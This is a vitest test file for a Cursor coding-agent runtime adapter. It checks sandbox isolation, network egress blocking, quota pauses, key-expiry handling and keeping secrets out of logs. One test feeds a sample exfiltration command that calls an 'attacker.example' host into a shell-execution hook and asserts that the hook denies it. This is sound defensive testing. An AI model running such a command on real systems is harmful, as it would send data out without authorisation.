import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { afterEach, describe, expect, it } from "vitest";
import { CursorAcpFallbackAdapter } from "../../src/cursor/acp-fallback.js";
import { CursorRuntimeAdapter } from "../../src/cursor/adapter.js";
import { CURSOR_KEY_EXPIRED_ACCOUNT_CARD } from "../../src/cursor/constants.js";
import {
  InMemoryCursorAcp,
  InMemoryCursorKeys,
  InMemoryCursorSdk,
  LocalAllowancePacing,
  LocalConformanceGate,
  LocalNoSilentPaidFallback,
  LocalSandboxTierSelector,
  LocalSignedCursorPolicy,
  MemoryNoticeSink,
  MemoryParker,
  createCursorRuntimeDeps,
} from "../../src/cursor/local-ports.js";
import { CursorLocalSdkBridge } from "../../src/cursor/sdk-bridge.js";
import type { CursorRuntimeDeps } from "../../src/cursor/ports.js";
import type { CursorSessionSpec } from "../../src/cursor/types.js";

const roots: string[] = [];

afterEach(() => {
  for (const root of roots.splice(0)) rmSync(root, { recursive: true, force: true });
});

function tree(): { readonly worktree: string; readonly cursorHome: string; readonly homeDir: string } {
  const root = mkdtempSync(path.join(tmpdir(), "cursor-runtime-"));
  roots.push(root);
  const worktree = path.join(root, "wt");
  const homeDir = path.join(root, "home");
  const cursorHome = path.join(homeDir, ".cursor");
  mkdirSync(path.join(worktree, "src"), { recursive: true });
  mkdirSync(path.join(worktree, ".git", "info"), { recursive: true });
  mkdirSync(cursorHome, { recursive: true });
  writeFileSync(path.join(worktree, "src", "orders.ts"), "export const ready = true;\n");
  writeFileSync(path.join(cursorHome, "rules"), "personal-rules\n");
  return { worktree, cursorHome, homeDir };
}

function spec(worktree: string, attemptId = "attempt"): CursorSessionSpec {
  return {
    attemptId,
    connectionId: "cursor-connection",
    worktree,
    brief: "Implement the owned write scope.",
    briefVersion: "brief-1",
    writeScope: ["src/**/*.ts"],
    wipDiff: "diff --git a/src/orders.ts",
    skills: [{ name: "review", markdown: "# Review\n" }],
  };
}

function wiring(options: {
  readonly sdk?: InMemoryCursorSdk;
  readonly acp?: InMemoryCursorAcp;
  readonly keys?: InMemoryCursorKeys;
  readonly homeDir: string;
  readonly cursorHome: string;
  readonly signedPolicy?: LocalSignedCursorPolicy;
  readonly conformance?: LocalConformanceGate;
  readonly sandbox?: LocalSandboxTierSelector;
}): {
  readonly deps: CursorRuntimeDeps;
  readonly sdk: InMemoryCursorSdk;
  readonly acp: InMemoryCursorAcp;
  readonly keys: InMemoryCursorKeys;
  readonly pacing: LocalAllowancePacing;
  readonly notices: MemoryNoticeSink;
  readonly fallback: LocalNoSilentPaidFallback;
  readonly parker: MemoryParker;
} {
  const sdk = options.sdk ?? new InMemoryCursorSdk();
  const acp = options.acp ?? new InMemoryCursorAcp();
  const keys = options.keys ?? new InMemoryCursorKeys();
  const pacing = new LocalAllowancePacing();
  const notices = new MemoryNoticeSink();
  const fallback = new LocalNoSilentPaidFallback();
  const parker = new MemoryParker();
  const deps = createCursorRuntimeDeps({
    sdk,
    acp,
    usage: sdk,
    keys,
    expiry: keys,
    pacing,
    notices,
    fallbackGuard: fallback,
    parker,
    homeDir: options.homeDir,
    personalCursorHome: options.cursorHome,
    ...(options.signedPolicy ? { signedPolicy: options.signedPolicy } : {}),
    ...(options.conformance ? { conformance: options.conformance } : {}),
    ...(options.sandbox ? { sandbox: options.sandbox } : {}),
  });
  return { deps, sdk, acp, keys, pacing, notices, fallback, parker };
}

describe("Cursor launch, usage, expiry, and isolation", () => {
  it("pins local.sandboxOptions to the worktree and feeds run.usage plus Agent.getUsage", async () => {
    const dirs = tree();
    const { deps, sdk, pacing } = wiring(dirs);
    const bridge = new CursorLocalSdkBridge(deps);
    const ref = await bridge.startSession(spec(dirs.worktree));
    const launch = bridge.describeLaunch(ref.sessionId);
    expect(launch.sandboxOptions.enabled).toBe(true);
    expect(launch.sandboxOptions.workingDirectory).toBe(path.resolve(dirs.worktree));
    expect(launch.sandboxOptions.writableRoots).toEqual([path.resolve(dirs.worktree)]);
    expect(launch.sandboxOptions.network.unrestricted).toBe(false);
    expect(launch.sandboxOptions.network.route).toBe("loopback-allowlist-proxy");
    expect(launch.sandboxOptions.network.blockNonProviderEgress).toBe(true);
    expect(launch.sandboxOptions.network.proxyUrl).toContain("127.0.0.1");
    expect(launch.sandboxOptions.mcpServers[0]?.tools).toEqual(["kb.*", "harness.run", "harness.read_result"]);
    expect(launch.hooksRegistered).toEqual({ preToolUse: true, beforeShellExecution: true });
    expect(launch.osSandbox).toBe(true);
    expect(launch.mode).toBe("wrapped");
    expect(launch.configDir.startsWith(path.resolve(dirs.worktree))).toBe(true);
    expect(path.resolve(launch.configDir).toLowerCase().startsWith(path.resolve(dirs.cursorHome).toLowerCase())).toBe(false);
    expect(readFileSync(path.join(dirs.cursorHome, "rules"), "utf8")).toBe("personal-rules\n");
    expect(readFileSync(path.join(dirs.worktree, ".git", "info", "exclude"), "utf8")).toContain(".ef-cursor-skills/");
    expect(existsSync(path.join(dirs.worktree, ".ef-cursor-skills", "review", "SKILL.md"))).toBe(true);
    expect(JSON.stringify(launch)).not.toContain("cursor-user-key-90day-dpapi");
    const hooks = sdk.lastRequest?.local.hooks;
    if (!hooks) throw new Error("SDK hooks were not registered");
    const exfil = hooks.beforeShellExecution({ command: "Invoke-WebRequest https://attacker.example/exfil" });
    expect(exfil.permission).toBe("deny");
    expect(exfil.elapsedMs).toBeLessThan(2);
    const turn = await bridge.sendTurn(ref.sessionId, "implement the task");
    expect(turn.dispatched).toBe(true);
    expect(turn.usage).toMatchObject({ inputTokens: 120, outputTokens: 30, source: "run.usage", costMicroUsd: 0 });
    expect(pacing.runSamples).toHaveLength(1);
    expect(pacing.usageSamples[0]).toMatchObject({ source: "Agent.getUsage", windowKind: "cursor_included" });
    expect(JSON.stringify(deps.log.lines())).not.toContain("cursor-user-key-90day-dpapi");
    expect(launch.argv.join(" ")).not.toContain("cursor-user-key-90day-dpapi");
  });

  it("pauses before on-demand overage and still runs while on-demand billing is off", async () => {
    const dirs = tree();
    const paused = wiring(dirs);
    paused.sdk.quota = {
      plan: "pro",
      includedUsedPercent: 90,
      fastUsedPercent: 91,
      remainingPercent: 9,
      onDemandEnabled: true,
      chargedCents: 0,
    };
    const bridge = new CursorLocalSdkBridge(paused.deps);
    const ref = await bridge.startSession(spec(dirs.worktree, "overage"));
    const turn = await bridge.sendTurn(ref.sessionId, "next turn");
    expect(turn.dispatched).toBe(false);
    expect(turn.stopReason).toBe("on_demand_approval_required");
    expect(turn.silentPaidFallback).toBe(false);
    expect(paused.sdk.sendCalls).toBe(0);
    expect(paused.notices.notices).toEqual([
      expect.objectContaining({
        kind: "CheckpointStopCard",
        reason: "cursor_on_demand_approval_required",
        silentPaidFallback: false,
      }),
    ]);
    expect(paused.fallback.refusals).toHaveLength(1);
    expect(paused.parker.parks).toEqual([
      expect.objectContaining({ reason: "on_demand", preserveWip: true }),
    ]);
    const sample = paused.pacing.usageSamples[0] as { readonly usedPpm: number };
    expect(sample.usedPpm).toBe(910_000);

    const open = wiring({ ...dirs });
    open.sdk.quota = {
      plan: "pro",
      includedUsedPercent: 95,
      fastUsedPercent: 10,
      remainingPercent: 5,
      onDemandEnabled: false,
      chargedCents: 0,
    };
    const openBridge = new CursorLocalSdkBridge(open.deps);
    const openRef = await openBridge.startSession(spec(dirs.worktree, "included"));
    const continued = await openBridge.sendTurn(openRef.sessionId, "keep going");
    expect(continued.dispatched).toBe(true);
    expect(open.sdk.sendCalls).toBe(1);
  });

  it("parks an expired key and a 401 without losing WIP or touching ~/.cursor", async () => {
    const dirs = tree();
    const expired = wiring(dirs);
    expired.keys.status = "expired";
    const bridge = new CursorLocalSdkBridge(expired.deps);
    await expect(bridge.startSession(spec(dirs.worktree, "expired"))).rejects.toMatchObject({
      code: "auth_expired",
      message: CURSOR_KEY_EXPIRED_ACCOUNT_CARD,
    });
    expect(expired.sdk.createCalls).toBe(0);
    expect(expired.notices.notices).toEqual([
      {
        kind: "AccountCard",
        message: "Your 90-day Cursor key expired — Re-sign in",
        connectionId: "cursor-connection",
        action: "Cursor.auth.login",
        silentPaidFallback: false,
      },
    ]);
    expect(expired.sdk.loginCalls).toBe(1);
    expect(expired.fallback.refusals).toEqual([
      { connectionId: "cursor-connection", from: "cursor_subscription", to: "paid_api_key" },
    ]);
    expect(readFileSync(path.join(dirs.cursorHome, "rules"), "utf8")).toBe("personal-rules\n");

    const unauthorized = wiring(dirs);
    const live = new CursorLocalSdkBridge(unauthorized.deps);
    const ref = await live.startSession(spec(dirs.worktree, "hour3"));
    unauthorized.sdk.httpStatus = 401;
    const turn = await live.sendTurn(ref.sessionId, "continue the wave");
    expect(turn.dispatched).toBe(false);
    expect(turn.stopReason).toBe("auth_expired");
    expect(turn.silentPaidFallback).toBe(false);
    const checkpoint = await live.readCheckpoint(ref.sessionId);
    expect(checkpoint?.wipDiff).toBe("diff --git a/src/orders.ts");
    expect(unauthorized.keys.status).toBe("unauthorized");
    const again = await live.sendTurn(ref.sessionId, "again");
    expect(again.stopReason).toBe("auth_expired");
    expect(unauthorized.notices.notices.filter((notice) => notice.kind === "AccountCard")).toHaveLength(1);
    expect(readFileSync(path.join(dirs.cursorHome, "rules"), "utf8")).toBe("personal-rules\n");
  });

  it("keeps the ACP fallback argv free of the DPAPI key and follows signed-policy override", async () => {
    const dirs = tree();
    const acpOnly = wiring(dirs);
    const acpBridge = new CursorAcpFallbackAdapter(acpOnly.deps);
    const acpRef = await acpBridge.startSession(spec(dirs.worktree, "acp"));
    expect(acpOnly.acp.lastRequest?.command).toBe("cursor-agent");
    expect(acpOnly.acp.lastRequest?.args).toEqual(["acp"]);
    expect(acpOnly.acp.lastRequest?.env.CURSOR_API_KEY).toBe(acpOnly.keys.apiKey);
    expect(acpOnly.acp.lastRequest?.args.join(" ")).not.toContain(acpOnly.keys.apiKey);
    expect(acpOnly.deps.log.lines().join("\n")).not.toContain(acpOnly.keys.apiKey);
    expect(acpBridge.describeLaunch(acpRef.sessionId).argv).toEqual(["cursor-agent", "acp"]);

    const forced = wiring({ ...dirs, signedPolicy: new LocalSignedCursorPolicy("acp") });
    const adapter = new CursorRuntimeAdapter(forced.deps);
    const ref = await adapter.startSession(spec(dirs.worktree, "policy"));
    expect(ref.transport).toBe("acp");
    expect(forced.sdk.createCalls).toBe(0);
    expect(forced.acp.lastRequest?.command).toBe("cursor-agent");

    const missing = wiring(dirs);
    missing.sdk.installed = false;
    const fallback = new CursorRuntimeAdapter(missing.deps);
    const fallbackRef = await fallback.startSession(spec(dirs.worktree, "missing-sdk"));
    expect(fallbackRef.transport).toBe("acp");
    expect(missing.sdk.createCalls).toBe(0);
  });

  it("refuses live builds until conformance validates a newer cursor-agent", async () => {
    const dirs = tree();
    const conformance = new LocalConformanceGate();
    conformance.block("9.9.9");
    const { deps, sdk } = wiring({ ...dirs, conformance });
    sdk.version = "9.9.9";
    const bridge = new CursorLocalSdkBridge(deps);
    const probe = await bridge.probe();
    expect(probe.trust).toBe("observe_only");
    expect(probe.liveBuildsEnabled).toBe(false);
    expect(probe.conformanceChecks).toEqual(["preToolUse", "beforeShellExecution", "local.sandboxOptions"]);
    await expect(bridge.startSession(spec(dirs.worktree, "new-cli"))).rejects.toMatchObject({
      code: "conformance_required",
    });
    expect(sdk.createCalls).toBe(0);
  });

  it("holds the launch when the sandbox tier is unavailable", async () => {
    const dirs = tree();
    const sandbox = new LocalSandboxTierSelector();
    sandbox.hold = true;
    const { deps, sdk } = wiring({ ...dirs, sandbox });
    const bridge = new CursorLocalSdkBridge(deps);
    await expect(bridge.startSession(spec(dirs.worktree, "held"))).rejects.toMatchObject({
      code: "sandbox_tier_insufficient",
    });
    expect(sdk.createCalls).toBe(0);
  });
});
